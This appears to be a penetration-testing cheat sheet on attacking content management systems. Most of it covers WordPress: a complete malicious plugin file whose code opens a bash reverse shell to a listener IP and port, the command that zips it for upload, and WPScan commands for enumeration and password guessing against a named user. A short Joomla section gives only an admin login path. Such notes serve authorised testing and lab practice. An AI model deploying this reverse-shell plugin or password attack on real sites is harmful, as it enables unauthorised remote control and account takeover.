# Misc Web Content Management Framework Security
[TOC]
###### tags: `Security` `CMS` `WordPress` `Joomla` `ContentManagementFramework`

# WordPress
## Reverse Shell
* WordPress Plugin
    * [WordPress Plugin : Reverse Shell](https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell)
    * `revsh-plugin.php`
    ```
    <?php

    /**
    * Plugin Name: Reverse Shell Plugin
    * Plugin URI:
    * Description: Reverse Shell Plugin
    * Version: 1.0
    * Author: Vince Matteo
    * Author URI: http://www.sevenlayers.com
    */

    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/7701 0>&1'");
    ?>
    ```
    `zip revsh-plugin.zip revsh-plugin.php`

## Tools
* login page: `http://example.tw/wp-login.php`
### WPScan
* API token
    * `--api-token XXX`
    * `~/.wpscan/scan.yml`
* Recon
    ```
    wpscan --url http://example.tw
    --enumerate [OPTS]
    ```
* Password Attack
    ```
    wpscan --url http://example.tw 
    --usernames "william.riker" 
    --passwords ./password_list
    ```

# Joomla
* login page: `http://example.tw/administrator/`